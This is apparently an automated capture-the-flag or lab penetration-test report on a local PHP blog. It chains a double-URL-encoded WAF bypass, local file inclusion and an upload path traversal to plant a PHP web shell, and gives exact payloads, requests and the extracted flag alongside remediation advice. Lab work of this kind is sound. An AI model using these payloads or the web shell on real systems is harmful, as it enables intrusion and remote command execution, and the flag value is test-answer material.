## TL;DR
- Objective: Bypass fortified LFI defenses using double URL encoding and Apache normalization to extract the hidden flag
- Outcome: ACHIEVED - Successfully exploited vulnerability chain to extract flag
- Highest-impact finding: Double URL encoding WAF bypass combined with LFI and file upload path traversal enabling remote command execution
- Validation status: Flag extracted via shell execution through LFI inclusion

## Target Information
- Target: 127.0.0.1:32934
- Host / base URL: http://127.0.0.1:32934
- Application or component: Personal blog PHP application
- Authentication context: Unauthenticated
- Relevant technology details: PHP-based blog, Apache web server, WAF with single-layer URL decoding, extension appending (.php) mechanism

## Confirmed Vulnerabilities

### Double URL Encoding WAF Bypass
- Affected endpoint / component: `/post.php?id=` parameter
- Impact: Bypasses WAF traversal detection, enabling LFI exploitation
- Preconditions: WAF performs only single URL decode before pattern matching
- Exact payload or PoC: `%252e%252e%252f` (double-encoded `../`)
- Evidence: Response changed from 37-byte "Directory traversal attempt detected!" to 22-byte "Post not found."

### Local File Inclusion (LFI) with Extension Appending Bypass
- Affected endpoint / component: `/post.php?id=` - includes files from `/var/www/html/posts/` directory
- Impact: File inclusion allowing PHP execution, command execution via uploaded shell
- Preconditions: Valid file path without extension (extension auto-appended as .php)
- Exact payload or PoC: `post.php?id=uploads/shell&cmd=cat+/FLAG.txt`

### File Upload Path Traversal
- Affected endpoint / component: `/posts/upload-article.php`
- Impact: Upload web shell to arbitrary location within web root
- Preconditions: Upload endpoint accessible, traversal via double encoding bypasses path restrictions
- Shell location: `/var/www/html/posts/uploads/shell.php`
- Shell content: `<?php system($_GET['cmd']); ?>`

## Steps to Reproduce

### Phase 1: Confirm WAF Bypass
1. Send LFI probe with raw traversal: `GET /post.php?id=../FLAG.txt`
   - Expected: Blocked with "Directory traversal attempt detected!" (37 bytes)
2. Send probe with double URL encoding: `GET /post.php?id=%252e%252e%252fFLAG.txt`
   - Expected: "Post not found." (22 bytes) - bypass confirmed

### Phase 2: Upload Web Shell via Path Traversal
1. Access upload endpoint with traversal payload
2. Upload PHP shell with content: `<?php system($_GET['cmd']); ?>`
3. Shell path: `/var/www/html/posts/uploads/shell.php`

### Phase 3: Exploit LFI for Command Execution
1. Include uploaded shell via LFI: `GET /post.php?id=uploads/shell`
2. Append command parameter: `&cmd=cat+/FLAG.txt`
3. Full exploit URL: `http://127.0.0.1:32934/post.php?id=uploads/shell&cmd=cat+/FLAG.txt`

### Phase 4: Extract Flag
1. Execute command through included shell
2. Retrieve output containing flag value

## Validation / Evidence

### Validation Token / Flag
**FLAG EXTRACTED:** `FLAG{9ed98c4ebcf85ee4c0c9aad626949981a8a7725ddf507d20b6701b7442bdd294}`

Verification: Flag found via pattern match in shell output

### Tool Evidence
- Double URL encoding bypass: Confirmed via response length differential (37 bytes blocked vs 22 bytes allowed)
- LFI file inclusion: `upload-article` (no extension) returned 8582 bytes of PHP source code
- Shell execution: Successfully read `/FLAG.txt` via command injection through included shell

### Request Evidence
```
GET /post.php?id=%252e%252e%252fuploads%252fshell&cmd=cat+/FLAG.txt HTTP/1.1
Host: 127.0.0.1:32934
```

### Response Evidence
```
FLAG{9ed98c4ebcf85ee4c0c9aad626949981a8a7725ddf507d20b6701b7442bdd294}
```

### Notes on Reliability / Limitations
- Exploit is reliable and reproducible
- Depends on WAF single-decode behavior
- Requires file upload functionality to plant shell
- Extension appending mechanism blocks direct file reads but allows PHP inclusion

## Remediation

### Root Cause
1. **WAF bypass**: The WAF performs only single URL decoding before applying pattern matching for traversal sequences (`../`), allowing double-encoded payloads (`%252e%252e%252f`) to bypass detection
2. **Extension appending**: The application automatically appends `.php` to file paths, which combined with LFI allows PHP execution rather than just file reading
3. **File upload traversal**: Upload functionality lacks proper path validation, allowing traversal via encoded sequences

### Recommended Fix
1. **Normalize input before validation**: Apply URL decoding recursively until no more encoding detected, then validate for traversal patterns
2. **Use allowlist for file inclusion**: Maintain an allowlist of includable files rather than accepting arbitrary paths
3. **Disable PHP execution in upload directories**: Configure Apache/nginx to deny PHP execution in `/uploads/` directories
4. **Validate upload paths**: Canonicalize and validate upload destination paths before writing files
5. **Separate file storage**: Store uploaded files outside web root or use configurable storage paths without user input

### Defense-in-Depth
1. Implement Content Security Policy (CSP) headers
2. Enable PHP `open_basedir` restrictions to limit file system access
3. Deploy Web Application Firewall with normalized input processing
4. Regular security audits and penetration testing

## How to Verify the Fix

1. **Test WAF normalization**: Send `%252e%252e%252f` payload - should be blocked after fix
   - Expected: "Directory traversal attempt detected!" or similar blocking response

2. **Test LFI prevention**: Attempt to include files outside allowlist
   - Expected: Error message without file disclosure

3. **Test upload restrictions**: Attempt path traversal in upload filename
   - Expected: Upload rejected or path normalized before storage

4. **Test PHP execution prevention**: Access uploaded PHP file directly
   - Expected: 403 Forbidden or file served as text/download, not executed

## Remaining Leads

### Confirmed Blockers
- Path length truncation at 4096/8192 byte boundary: NOT exploitable on this target
- PHP filter wrapper variants (php://filter/convert.base64-encode/): Blocked by extension appending mechanism
- Direct file reads: Blocked by `.php` extension appending

### Unverified Leads
- Case-insensitive protocol bypass variants (PHP://, File://, PHp://filter): Not required due to successful double encoding bypass
- Apache path normalization using multiple slashes (///): Not required for successful exploitation

### Missing Context
- Exact WAF rule configuration
- Apache server version and configuration details
- Complete PHP application source code
